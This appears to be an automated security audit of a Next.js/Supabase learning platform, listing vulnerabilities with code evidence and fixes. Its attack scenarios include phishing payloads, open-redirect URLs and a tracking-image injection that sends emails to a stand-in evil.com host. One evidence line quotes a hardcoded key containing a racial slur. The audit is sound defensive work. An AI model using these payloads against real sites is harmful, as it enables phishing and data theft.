# Security Audit Report — MainCourse (Swavleba)

**Target Application:** MainCourse (Swavleba) — Course Enrollment & Learning Platform
**Stack:** Next.js 14 / Supabase (PostgreSQL, Auth, Storage, Realtime, Edge Functions) / Resend / TypeScript
**Audit Date:** 2026-02-21
**Audit Type:** Static Analysis (Read-Only)
**Auditors:** RECON, EXPLOIT, HARDENING (automated security agents)
**Overall Risk Rating:** HIGH

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Critical Findings Dashboard](#2-critical-findings-dashboard)
3. [Vulnerability Registry](#3-vulnerability-registry)
   - [Critical (P0)](#critical-p0)
   - [High (P1)](#high-p1)
   - [Medium (P2)](#medium-p2)
   - [Low (P3)](#low-p3)
   - [Informational](#informational)
4. [Risk Heat Map by Component](#4-risk-heat-map-by-component)
5. [Attack Surface Map](#5-attack-surface-map)
6. [Compliance Gap Summary](#6-compliance-gap-summary)
7. [Prioritized Remediation Roadmap](#7-prioritized-remediation-roadmap)
8. [Positive Findings](#8-positive-findings)

---

## 1. Executive Summary

MainCourse is an educational platform handling user registration, course enrollment, financial transactions (balances, withdrawals, referral commissions), and real-time communication. The audit identified **two immediately exploitable critical vulnerabilities** that pose direct business risk:

- **An unauthenticated email-sending endpoint** that can be weaponized as an open phishing relay, allowing any internet user to send emails from the platform's legitimate domain to any recipient with arbitrary content.
- **A hardcoded access credential** committed to source control containing offensive language, presenting both a security breach vector and a severe reputational/legal liability.

Beyond these critical findings, the application lacks fundamental defensive controls expected of any production system handling financial data:

- No rate limiting on any API endpoint
- No brute force protection or account lockout
- No multi-factor authentication
- No structured audit logging
- Weak password policies (6 chars, no complexity)
- Open redirect vulnerabilities in authentication flows
- HTML injection in email templates (stored XSS)
- Debug endpoints exposing sensitive system data
- Wildcard CORS on all Supabase Edge Functions

The platform does demonstrate competent foundational security — Row-Level Security is enabled across all tables, authentication is verified server-side, admin authorization is consistent, and standard security headers are in place. However, these strengths are undermined by the critical and high-severity gaps identified.

**The application is NOT ready for production deployment in its current state.**

---

## 2. Critical Findings Dashboard

| Severity | Count | Immediate Action Required |
|----------|---------|--------------------------|
| **CRITICAL (P0)** | 2 | Yes — before any production traffic |
| **HIGH (P1)** | 7 | Yes — this sprint |
| **MEDIUM (P2)** | 10 | Next sprint |
| **LOW (P3)** | 4 | Backlog |
| **Informational** | 5 | Awareness only |
| **TOTAL** | **28** | |

---

## 3. Vulnerability Registry

---

### CRITICAL (P0)

---

#### V-001: Hardcoded Offensive Access Key in Source Code

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS v3.1** | 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) |
| **CWE** | CWE-798 (Use of Hard-Coded Credentials) |
| **Affected File** | `middleware.ts`, line 4 |

**Description:**
The team access bypass key is hardcoded directly in the middleware source code as a plaintext string. This key grants full site access by bypassing the coming-soon gate when passed as a URL query parameter (`?access=<key>`). The value itself contains a racial slur, which presents a severe reputational and legal liability independent of the security issue.

Since the key is transmitted as a URL query parameter, it will appear in:
- Browser history
- Server access logs
- CDN logs
- Referrer headers (sent to any third-party site a user clicks to)
- Any analytics or monitoring tools

**Evidence:**
```typescript
// middleware.ts, line 4
const TEAM_ACCESS_KEY = 'richniggers';
```

**Attack Scenario:**
1. Any person with access to the repository (or anyone who inspects client-side bundles) obtains the key.
2. They access any route with `?access=<key>` to bypass the coming-soon gate.
3. If a user with the access key visits the site and then clicks an external link, the full URL including the key leaks via the `Referer` header.
4. The key is permanently stored in git history even if the file is later modified.

**Recommended Fix:**
- Move the access key to an environment variable (`TEAM_ACCESS_KEY` in `.env`)
- Generate a cryptographically random token (e.g., `openssl rand -hex 32`)
- Scrub the current value from git history using `git filter-branch` or BFG Repo-Cleaner
- Consider a more robust access-control mechanism (e.g., allowlisted emails, invite tokens)

---

#### V-002: Unauthenticated Email Sending Endpoint (Open Relay)

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS v3.1** | 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H) |
| **CWE** | CWE-284 (Improper Access Control) |
| **Affected File** | `app/api/notifications/test-email/route.ts`, lines 1-40 |

**Description:**
The `/api/notifications/test-email` POST endpoint accepts arbitrary `to`, `subject`, `html`, and `text` fields with **zero authentication**. There is no Bearer token check, no admin verification, no rate limiting, and no CAPTCHA. Any unauthenticated internet user can send emails to any address with any content through the platform's Resend account, using the legitimate `wavleba.ge` sender domain.

**Evidence:**
```typescript
// app/api/notifications/test-email/route.ts
export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { to, subject, html, text } = body;
    // NO AUTHENTICATION CHECK AT ALL
    const messageId = await sendEmail({
      to,
      subject,
      html: html || `<p>${text}</p>`,
      text
    });
    return NextResponse.json({ success: true, messageId });
  }
}
```

**Attack Scenario:**
1. Attacker sends: `POST /api/notifications/test-email` with body:
   ```json
   {
     "to": "victim@company.com",
     "subject": "Urgent: Account Security Alert",
     "html": "<p>Your account has been compromised. <a href='https://evil.com/phish'>Click here to reset your password</a></p>"
   }
   ```
2. The email arrives from `Wavleba <no-reply@wavleba.ge>` — a legitimate domain, making the phishing highly convincing.
3. Attacker can also exhaust the Resend email quota (financial impact / denial of service).
4. Bulk email abuse can get the `wavleba.ge` domain blacklisted by email providers.

**Recommended Fix:**
- **Immediate:** Delete this endpoint entirely if it is only for testing.
- **If needed:** Add `verifyTokenAndGetUser()` + admin role check before allowing email sends.
- Add rate limiting regardless of auth status.

---

### HIGH (P1)

---

#### V-003: Open Redirect in Auth Callback

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1** | 7.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) |
| **CWE** | CWE-601 (URL Redirection to Untrusted Site) |
| **Affected File** | `app/auth/callback/route.ts`, lines 13, 93 |

**Description:**
The `next` parameter from the query string is taken directly from user input and used in a server-side redirect. While the code uses `new URL(next, baseUrl)`, this does NOT prevent open redirects — if `next` is an absolute URL like `https://evil.com`, the `URL` constructor ignores the base URL and redirects to the attacker's domain.

**Evidence:**
```typescript
// app/auth/callback/route.ts
const next = requestUrl.searchParams.get('next') || '/my-courses';
// ... auth code exchange ...
return NextResponse.redirect(new URL(next, baseUrl));
```

**Attack Scenario:**
1. Attacker crafts a legitimate-looking link:
   ```
   https://swavleba.ge/auth/callback?code=VALID_CODE&next=https://evil.com/phishing-page
   ```
2. User clicks the link, successfully authenticates with Supabase.
3. After authentication, they are silently redirected to `evil.com`.
4. The attacker's site displays a fake "session expired" page and harvests credentials.

**Recommended Fix:**
```typescript
// Validate that 'next' is a safe relative path
const next = requestUrl.searchParams.get('next') || '/my-courses';
const safeNext = next.startsWith('/') && !next.startsWith('//') ? next : '/my-courses';
return NextResponse.redirect(new URL(safeNext, baseUrl));
```

---

#### V-004: Open Redirect in Login Page

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1** | 7.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) |
| **CWE** | CWE-601 (URL Redirection to Untrusted Site) |
| **Affected File** | `app/login/page.tsx`, lines 114-119 |

**Description:**
The `redirect` query parameter is used directly as the post-login destination without any validation. Since this is a client-side redirect via `router.push()`, an attacker can redirect users to an external domain after login.

**Evidence:**
```typescript
// app/login/page.tsx
const redirectTo = searchParams.get('redirect');
// ... login logic ...
destination = redirectTo;
router.push(destination);
```

**Attack Scenario:**
1. Attacker sends phishing link: `/login?redirect=https://evil.com/steal-session`
2. User logs in normally (sees legitimate login page).
3. After successful login, `router.push('https://evil.com/steal-session')` sends them to the attacker's site.

**Recommended Fix:**
- Validate that `redirect` starts with `/` and does not start with `//`.
- Maintain an allowlist of valid redirect paths if possible.

---

#### V-005: Stored XSS via Email HTML Injection

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1** | 7.6 (AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:N) |
| **CWE** | CWE-79 (Cross-site Scripting — Stored) |
| **Affected File** | `lib/email-templates.ts`, lines 66, 89, 109, 113, 160, 164, 228-232 |

**Description:**
All email templates directly interpolate dynamic values into HTML without any sanitization or encoding. This affects:

- **Admin notifications:** `titleEn`, `titleGe`, `messageEn`, `messageGe` are interpolated raw
- **Enrollment templates:** `courseName` is interpolated raw
- **Welcome template:** `username` is interpolated raw
- **Rejection templates:** `courseName` and `reason` are interpolated raw

While most modern email clients block JavaScript execution, the HTML injection still enables:
- Form spoofing (fake password reset forms inside emails)
- Link injection (disguised phishing links)
- CSS-based data exfiltration
- Email layout manipulation

**Evidence:**
```typescript
// lib/email-templates.ts, lines 228-232
html: (data) => emailWrapper(`
  <h1 style="color: ${BRAND_COLOR}; margin-bottom: 24px;">${data.titleEn || ''}</h1>
  <p style="color: #333; font-size: 16px; line-height: 1.6;">${data.messageEn || ''}</p>
  ...
  <h1 style="color: ${BRAND_COLOR}; margin-bottom: 24px;">${data.titleGe || ''}</h1>
  <p style="color: #333; font-size: 16px; line-height: 1.6;">${data.messageGe || ''}</p>
`),

// Also vulnerable - line 89:
<h2>${data.courseName}</h2>

// Also vulnerable - line 66:
<h1>Welcome, ${data.username}!</h1>
```

**Attack Scenario:**
1. An admin (or attacker who compromised an admin account) creates a notification with:
   ```
   titleEn: "Important Update<img src='https://evil.com/track?email=${email}'>"
   messageEn: "<a href='https://evil.com/phish' style='color:blue'>Click here to update your payment info</a>"
   ```
2. All platform users receive this email from the trusted `wavleba.ge` domain.
3. Users click the link, believing it's legitimate, and enter credentials on the attacker's site.

Additionally, if an attacker can inject HTML into course names (via database compromise or other vulnerability), the enrollment notification emails become attack vectors.

**Recommended Fix:**
- Create an `escapeHtml()` utility function:
  ```typescript
  function escapeHtml(str: string): string {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }
  ```
- Apply it to ALL dynamic values before template interpolation.
- Consider using a safe email template library (e.g., MJML, React Email).

---

#### V-006: Debug Endpoints Leaking Sensitive System Data

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1** | 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) |
| **CWE** | CWE-200 (Exposure of Sensitive Information) |
| **Affected Files** | `app/api/admin/debug-requests/route.ts`, `app/api/admin/enrollment-requests/test/route.ts` |

**Description:**
The debug endpoint at `/api/admin/debug-requests` returns highly sensitive data including:
- Whether the service role key is present and its length
- Full enrollment request records (with payment screenshots)
- Complete user profiles (emails, usernames)
- Bundle request data
- Detailed comparison of RLS behavior
- Full stack traces on error (unconditional, line 165)

The test endpoint at `/api/admin/enrollment-requests/test/` similarly exposes detailed internal query behavior. While both require admin authentication, they dump far more data than any legitimate admin operation needs.

**Evidence:**
```typescript
// app/api/admin/debug-requests/route.ts
debugInfo.serviceRoleKeyLength = process.env.SUPABASE_SERVICE_ROLE_KEY?.length || 0;
// ...
debugInfo.errors.push({
  type: 'exception',
  message: error.message,
  stack: error.stack  // Full stack trace leaked to client
});
return NextResponse.json(debugInfo, { status: 500 });
```

**Attack Scenario:**
1. Attacker compromises an admin account (easier due to no MFA, weak passwords).
2. Calls `/api/admin/debug-requests` to enumerate all users, emails, enrollment data.
3. Uses `serviceRoleKeyLength` as metadata for key brute-forcing attacks.
4. Stack traces reveal internal file paths, library versions, and framework details.

**Recommended Fix:**
- Remove both debug/test endpoints from production entirely.
- If needed for development, gate behind `process.env.NODE_ENV === 'development'`.
- Never expose `serviceRoleKeyLength` or `error.stack` in any response.

---

#### V-007: Verbose Error Information Disclosure

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1** | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) |
| **CWE** | CWE-209 (Error Message Containing Sensitive Information) |
| **Affected Files** | `app/api/enrollment-requests/route.ts:329`, `app/api/bundle-enrollment-requests/route.ts:207`, multiple admin routes |

**Description:**
Many API routes return internal error details to the client, including database error messages, error stack traces, and database error codes. This information aids attackers in understanding the backend architecture.

**Evidence:**
```typescript
// app/api/enrollment-requests/route.ts, line 329
return NextResponse.json({
  error: errorMessage,
  details: error.details || error.stack || 'An unexpected error occurred'
}, { status: 500 });

// app/api/bundle-enrollment-requests/route.ts, line 207
return NextResponse.json({
  error: errorMessage,
  details: error.details || error.stack || 'An unexpected error occurred'
}, { status: 500 });
```

**Attack Scenario:**
1. Attacker sends malformed requests to various endpoints.
2. Error responses reveal: database table names, column names, constraint names, PostgreSQL error codes, internal file paths, library versions.
3. This reconnaissance data is used to craft targeted attacks (e.g., knowing column names helps craft injection payloads).

**Recommended Fix:**
- Return generic error messages to clients: `{ "error": "An unexpected error occurred" }`
- Log detailed errors server-side only via a structured logging library.
- The existing `lib/admin-auth.ts` `internalError()` function handles this correctly — use it consistently everywhere.

---

#### V-008: No Rate Limiting on Any API Endpoint

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1** | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L) |
| **CWE** | CWE-307 (Improper Restriction of Excessive Authentication Attempts) |
| **Affected Files** | All files under `app/api/` |

**Description:**
There is zero application-level rate limiting on any Next.js API route. No rate limiting libraries are installed (`package.json` contains no rate limiting packages). No middleware implements request counting or throttling. This affects every endpoint, including:

- Authentication endpoints (brute-force attacks)
- Email endpoints (spam and abuse)
- Enrollment endpoints (resource exhaustion)
- Referral code validation (enumeration)
- Admin notification sending (email flooding)

While Supabase Auth has rate limits configured in `supabase/config.toml` for auth-specific operations, the application's own API endpoints have none.

**Attack Scenario:**
- **Brute-force:** Attacker runs credential stuffing against login with common password lists.
- **Email spam:** Attacker floods `/api/coming-soon/subscribe` with millions of fake emails.
- **Referral enumeration:** Attacker brute-forces `/api/public/validate-referral-code` to find valid codes.
- **Resource exhaustion:** Attacker floods enrollment or withdrawal endpoints to overwhelm the database.

**Recommended Fix:**
- Implement middleware-level rate limiting using `@upstash/ratelimit` with Redis, or Vercel's built-in edge rate limiting.
- Apply different limits per endpoint category:
  - Auth endpoints: 5 requests/minute per IP
  - Public endpoints: 10 requests/minute per IP
  - Authenticated endpoints: 60 requests/minute per user
  - Admin endpoints: 30 requests/minute per user

---

#### V-009: No Brute Force Protection or Account Lockout

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1** | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) |
| **CWE** | CWE-307 (Improper Restriction of Excessive Authentication Attempts) |
| **Affected Files** | `lib/auth.ts:85-115`, `supabase/config.toml:190-194` |

**Description:**
The `signIn` function passes credentials directly to Supabase Auth with no tracking of failed login attempts, no account lockout mechanism, and no CAPTCHA integration. The CAPTCHA section in Supabase config is completely commented out. Supabase's default rate limit of 30 sign-in attempts per 5 minutes per IP is quite generous for targeted attacks.

**Evidence:**
```typescript
// lib/auth.ts
export async function signIn(email: string, password: string) {
  const supabase = createClient();
  const { data, error } = await supabase.auth.signInWithPassword({
    email,
    password,
  });
  // No failed attempt tracking, no lockout logic
}
```

```toml
# supabase/config.toml - CAPTCHA is commented out
# [auth.captcha]
# enabled = true
# provider = "hcaptcha"
```

**Attack Scenario:**
1. Attacker obtains a list of valid email addresses (via user enumeration or data breach).
2. Runs 30 password attempts every 5 minutes per IP address.
3. With rotating proxies, attempts are effectively unlimited.
4. Weak 6-character passwords (V-011) are cracked quickly.

**Recommended Fix:**
- Enable CAPTCHA in Supabase config (hCaptcha or Cloudflare Turnstile).
- Implement progressive delays after failed attempts.
- Lock accounts after 10 consecutive failures with email notification.
- Consider IP reputation checking.

---

### MEDIUM (P2)

---

#### V-010: Wildcard CORS on All Supabase Edge Functions

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **CVSS v3.1** | 5.4 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N) |
| **CWE** | CWE-942 (Permissive Cross-domain Policy) |
| **Affected File** | `supabase/functions/_shared/cors.ts`, line 6 |

**Description:**
All 27 Supabase Edge Functions use `Access-Control-Allow-Origin: *` with `authorization` in the allowed headers. This allows any website to make authenticated cross-origin requests to these endpoints if the user has a valid session token.

**Evidence:**
```typescript
// supabase/functions/_shared/cors.ts
export const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};
```

**Attack Scenario:**
1. Attacker hosts a malicious website at `evil.com`.
2. A logged-in Swavleba user visits `evil.com`.
3. JavaScript on `evil.com` makes cross-origin requests to Supabase Edge Functions with the user's authorization header.
4. The attacker can read notifications, trigger admin actions, or exfiltrate data — all from the user's browser.

**Recommended Fix:**
```typescript
export const corsHeaders = {
  'Access-Control-Allow-Origin': 'https://swavleba.ge',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};
```

---

#### V-011: Weak Password Policy

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **CVSS v3.1** | 5.1 |
| **CWE** | CWE-521 (Weak Password Requirements) |
| **Affected File** | `supabase/config.toml`, lines 169-172 |

**Description:**
The minimum password length is 6 characters with no complexity requirements. `password_requirements` is set to an empty string, meaning no uppercase, lowercase, digit, or special character requirements.

**Evidence:**
```toml
# supabase/config.toml
[auth.password]
minimum_password_length = 6
password_requirements = ""
```

**Recommended Fix:**
```toml
[auth.password]
minimum_password_length = 8
password_requirements = "lower_upper_letters_digits"
```

---

#### V-012: MFA Not Available

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **CVSS v3.1** | 5.0 |
| **CWE** | CWE-308 (Use of Single-factor Authentication) |
| **Affected File** | `supabase/config.toml`, lines 274-295 |

**Description:**
All MFA methods (TOTP, Phone, WebAuthn) are disabled. This platform handles financial transactions (user balance, withdrawals, referral commissions), yet neither admin nor user accounts have any second-factor authentication option.

**Evidence:**
```toml
[auth.mfa.totp]
enroll_enabled = false
verify_enabled = false

[auth.mfa.phone]
enroll_enabled = false
verify_enabled = false

# [auth.mfa.web_authn] - commented out entirely
```

**Recommended Fix:**
- Enable TOTP MFA: `enroll_enabled = true`, `verify_enabled = true`
- Enforce MFA for admin accounts at minimum.
- Consider making MFA required for withdrawal operations.

---

#### V-013: Unauthenticated Subscribe Endpoint with Service Role Client

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **CVSS v3.1** | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L) |
| **CWE** | CWE-770 (Allocation of Resources Without Limits) |
| **Affected File** | `app/api/coming-soon/subscribe/route.ts`, lines 6-60 |

**Description:**
The coming-soon subscribe endpoint uses `createServiceRoleClient()` which bypasses all Row-Level Security, and has no rate limiting or CAPTCHA. Any unauthenticated user can flood the `coming_soon_emails` table with unlimited entries.

**Evidence:**
```typescript
export async function POST(request: Request) {
  // No rate limiting, no CAPTCHA
  const supabase = createServiceRoleClient(); // Bypasses RLS
  const { error } = await supabase
    .from('coming_soon_emails')
    .insert({ email: email.toLowerCase().trim() });
}
```

**Recommended Fix:**
- Use the anon key with appropriate RLS policies instead of service role.
- Add rate limiting (IP-based, e.g., 5 requests/minute).
- Add CAPTCHA for bot prevention.

---

#### V-014: Missing CSRF Protection

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **CVSS v3.1** | 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N) |
| **CWE** | CWE-352 (Cross-Site Request Forgery) |
| **Affected Files** | All POST/PATCH API routes |

**Description:**
No CSRF token validation exists anywhere in the codebase. While most API routes use Bearer token authentication (which provides CSRF resistance since the token is in an `Authorization` header, not a cookie), the unauthenticated endpoints (`coming-soon/subscribe`, `notifications/test-email`) are fully vulnerable to CSRF.

**Recommended Fix:**
- Add Origin/Referer header validation in Next.js middleware for all POST requests.
- For unauthenticated endpoints, require a valid CSRF token or validate the `Origin` header matches the expected domain.

---

#### V-015: Missing Content Security Policy Header

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **CVSS v3.1** | 4.0 |
| **CWE** | CWE-1021 (Improper Restriction of Rendered UI Layers) |
| **Affected File** | `next.config.js` |

**Description:**
While the application sets X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy, and Permissions-Policy, there is no Content-Security-Policy (CSP) header for HTML pages. The only CSP present is the sandbox policy for SVG image optimization (line 15), which does not apply to regular pages. Without CSP, the application has no browser-level defense against XSS attacks.

**Recommended Fix:**
- Implement a strict CSP. Start with report-only mode:
  ```
  Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co;
  ```
- Gradually tighten the policy based on reports.

---

#### V-016: No Structured Audit Logging

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **CVSS v3.1** | 4.0 |
| **CWE** | CWE-778 (Insufficient Logging) |
| **Affected Files** | All files (686 `console.log` occurrences across 116 files) |

**Description:**
The application uses `console.log` and `console.error` exclusively for logging. There is:
- No structured logging library (no winston, pino, bunyan, etc.)
- No centralized audit trail for security-relevant events
- No log correlation (request IDs are ad-hoc and inconsistent)
- No guaranteed log persistence or shipping to a SIEM
- Critical admin actions (enrollment approval, withdrawal approval, notification sending) are logged only to stdout
- No alerting on suspicious patterns

**Recommended Fix:**
- Install and configure `pino` (recommended for Next.js) or `winston`.
- Create audit log events for: login success/failure, admin actions, financial operations, role changes.
- Ship logs to a log aggregation service (e.g., Datadog, Axiom, Logflare).
- Set up alerts for anomalous patterns (bulk failed logins, admin actions from new IPs).

---

#### V-017: Insecure Session Configuration

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **CVSS v3.1** | 4.0 |
| **CWE** | CWE-613 (Insufficient Session Expiration) |
| **Affected File** | `supabase/config.toml`, lines 205, 248-253 |

**Description:**
Session timebox and inactivity timeout are commented out, meaning sessions never expire due to inactivity. While JWT tokens expire in 1 hour, refresh tokens can keep sessions alive indefinitely. Additionally, `secure_password_change = false` means users don't need to re-authenticate to change their password.

**Evidence:**
```toml
secure_password_change = false

# [auth.sessions]
# timebox = "24h"
# inactivity_timeout = "8h"
```

**Recommended Fix:**
```toml
secure_password_change = true

[auth.sessions]
timebox = "24h"
inactivity_timeout = "8h"
```

---

#### V-018: Service Role Client on Public Endpoints

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **CVSS v3.1** | 4.3 |
| **CWE** | CWE-269 (Improper Privilege Management) |
| **Affected Files** | `app/api/public/validate-referral-code/route.ts:29`, `app/api/health/route.ts:35` |

**Description:**
Unauthenticated endpoints create service role clients that bypass all Row-Level Security. While they perform specific limited queries, any bug or injection in these endpoints would grant full unrestricted database access. The health endpoint queries the `profiles` table with service role privileges without any authentication.

**Recommended Fix:**
- Use the anon key for all unauthenticated endpoints.
- Create dedicated RLS policies that allow the specific public queries needed.

---

#### V-019: Missing Pagination Bounds

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **CVSS v3.1** | 4.3 |
| **CWE** | CWE-770 (Allocation of Resources Without Limits) |
| **Affected File** | `app/api/notifications/route.ts`, lines 32-33 |

**Description:**
The `page` and `limit` query parameters are parsed from user input with no upper bound validation. An attacker can request `?limit=999999999` to force the database to return an enormous result set, causing memory exhaustion or timeout.

**Evidence:**
```typescript
const page = parseInt(searchParams.get('page') || '1', 10);
const limit = parseInt(searchParams.get('limit') || '20', 10);
// No max limit check
const offset = (page - 1) * limit;
```

**Recommended Fix:**
```typescript
const limit = Math.min(Math.max(parseInt(searchParams.get('limit') || '20', 10), 1), 100);
const page = Math.min(Math.max(parseInt(searchParams.get('page') || '1', 10), 1), 10000);
```

---

### LOW (P3)

---

#### V-020: Email Confirmation Disabled

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **CVSS v3.1** | 3.7 |
| **CWE** | CWE-287 (Improper Authentication) |
| **Affected File** | `supabase/config.toml`, line 203 |

**Description:**
`enable_confirmations = false` allows users to register with any email address (including addresses they don't own) and immediately use the platform. Note: This may be a local development config; verify production settings.

**Recommended Fix:**
Ensure `enable_confirmations = true` in the production Supabase project.

---

#### V-021: `dangerouslyAllowSVG` Enabled

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **CVSS v3.1** | 3.7 |
| **CWE** | CWE-79 (XSS via SVG) |
| **Affected File** | `next.config.js`, line 14 |

**Description:**
`dangerouslyAllowSVG: true` enables SVG processing through Next.js Image Optimization. SVGs can contain embedded JavaScript. While the current sandbox CSP mitigates execution, this remains a defense-in-depth concern.

**Evidence:**
```javascript
dangerouslyAllowSVG: true,
contentSecurityPolicy: "default-src 'self'; script-src 'none'; sandbox;",
```

**Recommended Fix:**
If SVGs are required, the current sandbox policy is reasonable but document the risk. Otherwise, disable SVG processing.

---

#### V-022: Excessive Storage File Size Limit (10 GiB)

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **CVSS v3.1** | 3.5 |
| **CWE** | CWE-400 (Uncontrolled Resource Consumption) |
| **Affected Files** | `supabase/config.toml:106`, `supabase/migrations/078_remove_video_size_limit.sql` |

**Description:**
The global file size limit is 10 GiB. The `course-videos` and `chat-media` buckets also allow 10 GB per file. Public buckets (`course-videos`, `course-thumbnails`) are viewable by anyone without authentication. No virus/malware scanning exists for uploaded files.

**Recommended Fix:**
- Set per-bucket limits appropriate to content type (e.g., 5 MB for payment screenshots, 50 MB for chat media).
- Review whether `course-videos` and `course-thumbnails` truly need to be public buckets.
- Consider adding antivirus scanning for uploaded files.

---

#### V-023: Dev Server Binds to All Network Interfaces

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **CVSS v3.1** | 2.0 |
| **CWE** | CWE-668 (Exposure of Resource to Wrong Sphere) |
| **Affected File** | `package.json`, lines 6-7 |

**Description:**
Dev scripts include `-H 0.0.0.0`, binding the development server to all network interfaces. This exposes the development server to the entire local network.

**Recommended Fix:**
Remove `-H 0.0.0.0` from dev scripts or use `127.0.0.1` explicitly.

---

### INFORMATIONAL

---

#### V-024: Excessive Console Logging of PII

| Field | Value |
|-------|-------|
| **CWE** | CWE-532 (Sensitive Information in Log Files) |
| **Affected Files** | Multiple admin API routes |

**Description:**
`console.log` and `console.error` statements log user IDs, email addresses, request IDs, status values, and error details. In production, these logs may be stored in logging services with different retention and access policies. PII in logs creates GDPR/privacy compliance exposure.

**Recommended Fix:**
Reduce logging verbosity in production. Redact PII (emails, user IDs) from log messages.

---

#### V-025: Service Role Key Fallback Pattern

| Field | Value |
|-------|-------|
| **CWE** | CWE-269 (Improper Privilege Management) |
| **Affected File** | `lib/supabase-server.ts`, lines 24-46 |

**Description:**
When `SUPABASE_SERVICE_ROLE_KEY` is missing, `createServiceRoleClient()` silently falls back to using the user's access token or anon key. This means production behavior differs based on environment configuration. If the service role key is accidentally unset, admin operations may silently fail or behave differently without any error indication.

**Recommended Fix:**
Fail loudly in production when the service role key is missing rather than silently degrading.

---

#### V-026: Duplicate API Surface

| Field | Value |
|-------|-------|
| **Affected Files** | 32 routes in `app/api/`, 27 functions in `supabase/functions/` |

**Description:**
The application has two parallel API surfaces with overlapping functionality. This doubles the attack surface and makes consistent security enforcement harder. Security controls applied to one surface may be missing from the other.

**Recommended Fix:**
Consolidate to a single API surface where possible. Ensure security controls are consistent across both.

---

#### V-027: SECURITY DEFINER Functions Without search_path

| Field | Value |
|-------|-------|
| **CWE** | CWE-269 (Improper Privilege Management) |
| **Affected Files** | Multiple migration files under `supabase/migrations/` |

**Description:**
Over 20 PostgreSQL functions are created with `SECURITY DEFINER` (running with the privileges of the function owner) but none set `search_path` explicitly. If the `public` schema's `search_path` is manipulated, an attacker could shadow built-in functions and execute arbitrary SQL with elevated privileges.

**Recommended Fix:**
Add `SET search_path = public, extensions` to all `SECURITY DEFINER` functions.

---

#### V-028: No Dependency Vulnerability Scanning

| Field | Value |
|-------|-------|
| **CWE** | CWE-1104 (Use of Unmaintained Third-Party Components) |
| **Affected File** | `package.json` |

**Description:**
No `npm audit`, Snyk, or Dependabot configuration was found. No automated vulnerability scanning pipeline exists for dependencies. The dependency tree has no automated monitoring for known CVEs.

**Recommended Fix:**
- Enable GitHub Dependabot or Snyk for automated dependency scanning.
- Add `npm audit` to CI/CD pipeline.
- Set up alerts for critical CVEs in dependencies.

---

## 4. Risk Heat Map by Component

| Component | Critical | High | Medium | Low |
|-----------|----------|------|--------|-----|
| `middleware.ts` | V-001 | — | V-014 | — |
| `app/api/notifications/` | V-002 | V-005 | V-019 | — |
| `app/auth/callback/` | — | V-003 | — | — |
| `app/login/` | — | V-004 | — | — |
| `app/api/admin/*` | — | V-006, V-007 | — | — |
| `app/api/enrollment-*` | — | V-007 | — | — |
| `lib/email-templates.ts` | — | V-005 | — | — |
| `supabase/functions/` | — | — | V-010 | — |
| `supabase/config.toml` | — | V-008, V-009 | V-011, V-012, V-017, V-020 | — |
| `app/api/public/*` | — | — | V-013, V-018 | — |
| `next.config.js` | — | — | V-015 | V-021 |
| Database functions | — | — | — | V-027 |
| Infrastructure | — | — | V-016 | V-023, V-028 |

---

## 5. Attack Surface Map

### Entry Points

| Entry Point Type | Count | Auth Required | Risk Notes |
|---|---|---|---|
| Next.js API Routes | 32 | Mostly yes | 3 unauthenticated, no rate limiting |
| Supabase Edge Functions | 27 | Mostly yes | Wildcard CORS |
| Auth Callback | 1 | No | Open redirect |
| Coming-soon Subscribe | 1 | No | No rate limit, service role |
| Public Referral Validate | 1 | No | No rate limit, service role |
| Test Email Endpoint | 1 | **No** | **CRITICAL: Open relay** |
| Health/Ping | 2 | No | Info disclosure |
